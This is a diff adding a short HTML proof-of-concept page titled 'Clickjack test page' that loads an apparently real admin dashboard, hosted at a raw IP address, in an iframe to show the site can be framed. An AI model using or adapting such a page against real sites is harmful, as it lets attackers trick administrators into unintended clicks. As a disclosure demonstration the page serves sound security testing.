@@ -1,0 +1,9 @@
+<html>
+<head>
+<title> Clickjack test page </title>
+</head>
+<body>
+<p>Website is vulnerable to clickjacking </p>
+<iframe src="http://45.115.99.199/NTCA_MIS/Auth/Adminpanel/DashboardNTCA.aspx" width="1200" height="900"></iframe>
+</body>
+</html>
